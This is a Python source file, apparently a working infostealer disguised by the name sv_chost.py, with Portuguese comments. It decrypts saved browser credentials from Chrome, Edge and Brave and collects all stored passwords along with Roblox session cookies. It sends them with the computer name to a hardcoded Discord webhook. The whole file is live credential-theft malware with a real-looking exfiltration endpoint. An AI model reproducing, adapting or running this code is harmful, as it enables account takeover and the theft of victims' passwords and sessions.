# language: Python, file: sv_chost.py
import os
import sqlite3
import shutil
import base64
import json
import urllib.request
import win32crypt
from Crypto.Cipher import AES

# ==========================================
# CONFIGURAÇÃO DO WEBHOOK
# ==========================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1566930866641444904/sRinssvkTaFzHyII_5lGlYCKVnmJRSIeb5vMq7XOd245mWEPchhOK_ZmzXwU13o2piV8"

def get_master_key(browser_path):
    """Pega a chave mestra do Local State do navegador"""
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] # Remove o prefixo DPAPI
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_chrome_value(enc_value, master_key):
    """Descriptografa o valor usando AES-GCM (Chrome/Edge v80+)"""
    try:
        iv = enc_value[3:15]
        payload = enc_value[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
        return decrypted
    except Exception:
        try:
            # Fallback para versões antigas
            return str(win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1], 'utf-8')
        except Exception:
            return ""

def steal_browser_data(browser_name, user_data_path):
    results = {"cookies": [], "passwords": []}
    
    if not os.path.exists(user_data_path):
        return results

    master_key = get_master_key(os.path.dirname(user_data_path))
    
    # 1. Cookies (Roblox)
    cookies_path = os.path.join(user_data_path, "Network", "Cookies")
    temp_cookies = os.path.join(os.getenv('TEMP'), f'tmp_cookies_{browser_name}.db')
    
    if os.path.exists(cookies_path) and master_key:
        try:
            shutil.copy2(cookies_path, temp_cookies)
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
            for host, name, enc_val in cursor.fetchall():
                if name == '.ROBLOSECURITY':
                    dec_val = decrypt_chrome_value(enc_val, master_key)
                    if dec_val:
                        results["cookies"].append(f"{browser_name} | {name}: {dec_val}")
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_cookies): os.remove(temp_cookies)

    # 2. Senhas
    login_path = os.path.join(user_data_path, "Login Data")
    temp_login = os.path.join(os.getenv('TEMP'), f'tmp_login_{browser_name}.db')
    
    if os.path.exists(login_path) and master_key:
        try:
            shutil.copy2(login_path, temp_login)
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pass in cursor.fetchall():
                if user and enc_pass:
                    dec_pass = decrypt_chrome_value(enc_pass, master_key)
                    if dec_pass:
                        results["passwords"].append(f"{browser_name} | {url} | {user} | {dec_pass}")
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_login): os.remove(temp_login)

    return results

def send_to_discord(data):
    if not data["cookies"] and not data["passwords"]:
        print("[-] Nenhum dado encontrado nos navegadores.")
        return

    pc_name = os.getenv('COMPUTERNAME')
    
    # Prepara os textos
    cookies_text = "\n".join(data["cookies"]) if data["cookies"] else "Nenhum"
    passwords_text = "\n".join(data["passwords"]) if data["passwords"] else "Nenhuma"

    # O Discord tem limite de 2000 caracteres por mensagem.
    mensagem = f"**Log Capturado - {pc_name}**\n\n"
    mensagem += f"**🍪 COOKIES:**\n```{cookies_text[:1000]}```\n"
    mensagem += f"**🔑 SENHAS:**\n```{passwords_text[:800]}```"
    
    if len(mensagem) > 1950:
        mensagem = mensagem[:1950] + "\n... (truncado)"

    payload = {"content": mensagem}
    data_json = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data_json, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
    
    try:
        urllib.request.urlopen(req)
        print("[+] Enviado pro Discord com sucesso!")
    except Exception as e:
        print(f"[-] Erro ao enviar: {e}")

def main():
    local_appdata = os.getenv('LOCALAPPDATA')
    
    browsers = {
        "Chrome": os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default'),
        "Edge": os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
        "Brave": os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
    }

    all_data = {"cookies": [], "passwords": []}

    for name, path in browsers.items():
        browser_data = steal_browser_data(name, path)
        all_data["cookies"].extend(browser_data["cookies"])
        all_data["passwords"].extend(browser_data["passwords"])

    send_to_discord(all_data)

if __name__ == "__main__":
    main()
